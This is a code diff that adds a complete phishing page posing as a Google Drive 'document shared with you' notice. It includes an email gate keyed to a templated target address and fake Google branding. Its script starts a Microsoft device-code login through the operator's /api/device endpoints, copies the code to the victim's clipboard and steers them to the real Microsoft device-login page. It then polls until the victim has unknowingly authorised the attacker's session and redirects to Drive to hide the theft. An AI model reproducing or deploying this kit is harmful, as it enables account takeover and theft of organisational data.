@@ -1,0 +1,154 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google Drive — Document Shared With You</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f1f3f4;font-family:'Google Sans','Inter',sans-serif;min-height:100vh}
+.page{max-width:640px;margin:0 auto;background:#fff;box-shadow:0 1px 8px rgba(0,0,0,.12);min-height:100vh}
+/* Header */
+.header{padding:16px 24px;border-bottom:1px solid #e8eaed;display:flex;align-items:center;justify-content:space-between}
+.g-logo{display:flex;align-items:center;gap:8px}
+.g-icon{display:flex;align-items:center;gap:0}
+.hero-top{background:#1a73e8;padding:22px 24px}
+.ht-inner{display:flex;align-items:center;gap:12px}
+.g-drive-icon{width:44px;height:44px;background:rgba(255,255,255,.15);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ht-text h2{font-size:17px;font-weight:700;color:#fff}
+.ht-text p{font-size:12px;color:rgba(255,255,255,.8);margin-top:3px}
+/* Content */
+.content{padding:22px 24px}
+/* Doc card - Google Docs style */
+.doc-card{border:1px solid #e8eaed;border-radius:8px;overflow:hidden;margin-bottom:18px;cursor:pointer}
+.dc-thumb{background:#fff;padding:16px;display:flex;justify-content:center;align-items:center;min-height:120px;border-bottom:1px solid #f1f3f4;position:relative}
+.doc-mockup{width:80px;border:1px solid #e8eaed;border-radius:2px;background:#fff;padding:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+.dm-header{height:6px;background:#1a73e8;border-radius:1px;margin-bottom:6px}
+.dm-line{height:4px;background:#e8eaed;border-radius:1px;margin-bottom:5px}
+.dm-line.w80{width:80%}
+.dm-line.w60{width:60%}
+.dm-line.w90{width:90%}
+.dm-line.w70{width:70%}
+.doc-type-badge{position:absolute;top:10px;right:10px;background:#1a73e8;color:#fff;font-size:10px;font-weight:700;border-radius:3px;padding:3px 7px}
+.dc-info{padding:12px 16px;display:flex;align-items:center;gap:10px}
+.dc-file-icon{width:28px;height:28px;flex-shrink:0}
+.dc-file-name{font-size:13px;font-weight:600;color:#202124;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dc-file-meta{font-size:11px;color:#80868b;margin-top:2px}
+/* Sharer row */
+.sharer-row{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid #f1f3f4;margin-bottom:16px}
+.avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#1a73e8,#34a853);display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700;flex-shrink:0}
+.sharer-info{flex:1}
+.sharer-label{font-size:11px;color:#80868b}
+.sharer-name{font-size:13px;font-weight:600;color:#202124}
+.share-time{font-size:11px;color:#80868b;white-space:nowrap}
+/* Permission */
+.perm-tag{display:inline-flex;align-items:center;gap:5px;background:#e8f0fe;color:#1a73e8;border-radius:4px;padding:4px 10px;font-size:12px;font-weight:600;margin-bottom:16px}
+/* Buttons */
+.btn-open{display:block;width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:8px;letter-spacing:.3px}
+.btn-open:hover{background:#1557b0}
+.btn-row{display:flex;gap:8px;margin-bottom:14px}
+.btn-sm{flex:1;background:#fff;color:#1a73e8;border:1px solid #dadce0;border-radius:4px;padding:10px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit}
+.g-note{font-size:11px;color:#80868b;text-align:center}
+/* Footer */
+.footer{background:#f8f9fa;padding:16px 24px;border-top:1px solid #e8eaed}
+.footer p{font-size:11px;color:#80868b;line-height:1.8}
+.footer a{color:#1a73e8}
+/* Overlays */
+#auth-overlay{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.7);backdrop-filter:blur(3px);align-items:center;justify-content:center}
+.auth-box{background:#fff;border-radius:8px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.2)}
+#email-gate{display:none;position:fixed;inset:0;z-index:9999;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.72);backdrop-filter:blur(8px)}
+.gate-box{background:#fff;border-radius:8px;padding:36px 28px;width:90%;max-width:400px;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.25)}
+.gate-input{width:100%;padding:12px 14px;border:1px solid #dadce0;border-radius:4px;font-size:14px;font-family:inherit;outline:none;margin-bottom:8px;transition:border .15s}
+.gate-input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
+.gate-btn{width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
+.gate-err{color:#d93025;font-size:13px;margin-bottom:8px;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+</style></head><body>
+<div class="page">
+  <div class="header">
+    <div class="g-logo">
+      <!-- Google Drive logo in SVG -->
+      <svg width="110" height="28" viewBox="0 0 110 28" fill="none"><g transform="translate(0,4)"><path d="M7 16L0 5h6l7 11H7z" fill="#0F9D58"/><path d="M14 16L7 5h13l7 11H14z" fill="#4285F4"/><path d="M14 16h13l-7-11H14v5l3.5 6H14z" fill="#FBBC05"/></g><text x="28" y="19" font-family="'Google Sans',Arial,sans-serif" font-size="14" font-weight="500" fill="#202124">Drive</text></svg>
+    </div>
+    <span style="font-size:12px;color:#80868b">Google Workspace</span>
+  </div>
+  <div class="hero-top">
+    <div class="ht-inner">
+      <div class="g-drive-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 19h6l4-7 4 7h6L12 2zm0 4.5L16.5 15h-9L12 6.5z"/></svg></div>
+      <div class="ht-text"><h2>A document was shared with you</h2><p>Google Drive · Shared from your organization's workspace</p></div>
+    </div>
+  </div>
+  <div class="content">
+    <div class="doc-card" onclick="startAuth()">
+      <div class="dc-thumb">
+        <div class="doc-mockup">
+          <div class="dm-header"></div>
+          <div class="dm-line w80"></div><div class="dm-line w90"></div><div class="dm-line w60"></div>
+          <div class="dm-line w80"></div><div class="dm-line w70"></div>
+        </div>
+        <span class="doc-type-badge">DOCS</span>
+      </div>
+      <div class="dc-info">
+        <svg class="dc-file-icon" viewBox="0 0 28 28" fill="none"><rect width="28" height="28" rx="2"/><path d="M5 0h13l8 8v18a2 2 0 01-2 2H5a2 2 0 01-2-2V2a2 2 0 012-2z" fill="#4285F4" opacity=".12"/><path d="M5 0h13l8 8v2H16a3 3 0 01-3-3V0z" fill="#1a73e8"/><path d="M5 0h13v7a1 1 0 001 1h7v18a2 2 0 01-2 2H5a2 2 0 01-2-2V2a2 2 0 012-2z" fill="#4285F4"/></svg>
+        <div>
+          <div class="dc-file-name">Annual_Business_Plan_2026_v3.docx</div>
+          <div class="dc-file-meta">Google Docs · Opened in Drive · Shared with you today</div>
+        </div>
+      </div>
+    </div>
+    <div class="sharer-row">
+      <div class="avatar">GW</div>
+      <div class="sharer-info">
+        <div class="sharer-label">Document shared from</div>
+        <div class="sharer-name">Google Workspace · Your Organization</div>
+      </div>
+      <span class="share-time">Today, 8:41 AM</span>
+    </div>
+    <div class="perm-tag"><svg width="12" height="12" viewBox="0 0 24 24" fill="#1a73e8"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>Can view &amp; comment</div>
+    <button class="btn-open" onclick="startAuth()">Open with Google Docs</button>
+    <div class="btn-row">
+      <button class="btn-sm" onclick="startAuth()">⬇ Download</button>
+      <button class="btn-sm" onclick="startAuth()">📋 Make a copy</button>
+    </div>
+    <div class="g-note">Sign in with your work Microsoft or Google account to access this document</div>
+  </div>
+  <div class="footer">
+    <p>Google LLC · 1600 Amphitheatre Parkway, Mountain View, CA 94043</p>
+    <p><a href="#">Unsubscribe</a> · <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a> · © 2026 Google LLC</p>
+  </div>
+</div>
+<div id="auth-overlay">
+  <div class="auth-box">
+    <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:18px"><svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg><span style="font-size:15px;font-weight:300;color:#555">Microsoft</span></div>
+    <h3 id="auth-title" style="font-size:18px;font-weight:700;color:#202124;margin-bottom:6px">Sign in to open document</h3>
+    <p id="auth-sub" style="font-size:13px;color:#80868b;margin-bottom:22px;line-height:1.6">Verify your work account to access this shared Google Drive document.</p>
+    <div id="spinner-sec"><div style="width:34px;height:34px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 12px"></div><p style="font-size:13px;color:#bbb">Connecting…</p></div>
+    <div id="code-sec" style="display:none">
+      <p style="font-size:12px;color:#80868b;margin-bottom:12px">Your code is ready. Click below — it opens Microsoft and pastes for you.</p>
+      <div id="code-val" onclick="openLogin()" style="font-size:32px;font-weight:900;letter-spacing:8px;color:#202124;font-family:monospace;background:#e8f0fe;border-radius:4px;padding:12px;margin-bottom:16px;cursor:pointer;border:2px dashed #1a73e8"></div>
+      <button onclick="openLogin()" id="open-btn" style="width:100%;padding:14px;font-size:15px;font-weight:700;border:none;border-radius:4px;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;background:#1a73e8;color:#fff"><svg width="18" height="18" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>Open Microsoft Device Login →</button>
+      <p id="cp-ok" style="font-size:12px;color:#22c55e;display:none;margin-bottom:4px">✅ Code copied! Paste it on the Microsoft page.</p>
+      <p style="font-size:11px;color:#80868b;margin-top:4px">Expires in <span id="xtimer">15:00</span> · <span onclick="cpCode()" style="cursor:pointer;color:#1a73e8">Copy manually</span></p>
+    </div>
+    <div id="ok-sec" style="display:none"><svg width="48" height="48" viewBox="0 0 24 24" fill="#0F9D58" style="margin-bottom:10px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg><p style="font-size:15px;font-weight:700;color:#0F9D58">Verified</p><p style="font-size:13px;color:#80868b;margin-top:4px">Opening document…</p></div>
+  </div>
+</div>
+<div id="email-gate">
+  <div class="gate-box">
+    <svg width="110" height="28" viewBox="0 0 110 28" fill="none" style="margin:0 auto 16px;display:block"><g transform="translate(0,4)"><path d="M7 16L0 5h6l7 11H7z" fill="#0F9D58"/><path d="M14 16L7 5h13l7 11H14z" fill="#4285F4"/><path d="M14 16h13l-7-11H14v5l3.5 6H14z" fill="#FBBC05"/></g><text x="28" y="19" font-family="'Google Sans',Arial,sans-serif" font-size="14" font-weight="500" fill="#202124">Drive</text></svg>
+    <p style="font-size:17px;font-weight:700;color:#202124;margin-bottom:6px">Confirm Your Email</p>
+    <p style="font-size:13px;color:#80868b;margin-bottom:20px;line-height:1.6">This document notification was delivered to your work inbox. Enter the email address where you received it to open the file.</p>
+    <input id="gem" class="gate-input" type="email" placeholder="Your work email address" onkeydown="if(event.key==='Enter')gv()">
+    <div id="gerr" class="gate-err">❌ Email not recognised. Enter the address where you received this share notification.</div>
+    <button class="gate-btn" onclick="gv()">Continue to Document →</button>
+    <p style="font-size:11px;color:#bbb;margin-top:12px">🔒 Google Drive Secure Access</p>
+  </div>
+</div>
+<script>
+const LINK_ID='{{LINK_ID}}',TARGET='{{TARGET_EMAIL}}';
+(function(){if(!TARGET)return;const g=document.getElementById('email-gate');g.style.display='flex';setTimeout(()=>{const i=document.getElementById('gem');if(i)i.focus();},150);})();
+function gv(){const e=(document.getElementById('gem').value||'').trim().toLowerCase(),err=document.getElementById('gerr');if(e===TARGET.toLowerCase()){const g=document.getElementById('email-gate');g.style.transition='opacity .3s';g.style.opacity='0';setTimeout(()=>g.remove(),300);}else{err.style.display='block';const i=document.getElementById('gem');i.style.borderColor='#d93025';i.style.animation='sh .35s ease';setTimeout(()=>{i.style.animation='';i.style.borderColor='';},400);}}
+let sc='',pi,ci,tl=900;
+function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.user_code||d.userCode;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';setTimeout(()=>window.location.href='https://drive.google.com',2500);}}).catch(()=>{});},(d.interval||5)*1000);}).catch(()=>location.reload());}
+function openLogin(){cpCode();const url='https://microsoft.com/devicelogin';const w=window.open(url,'_blank','width=560,height=620,left=200,top=100,noopener');if(!w||w.closed||typeof w.closed==='undefined'){const btn=document.getElementById('open-btn');if(btn){btn.textContent='⏎ Redirecting…';}setTimeout(()=>window.location.href=url,800);}}
+function cpCode(){const ta=document.createElement('textarea');ta.value=sc;ta.style.cssText='position:fixed;top:-999px;opacity:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);const ok=document.getElementById('cp-ok');if(ok){ok.style.display='block';setTimeout(()=>ok.style.display='none',3000);}}
+</script></body></html>
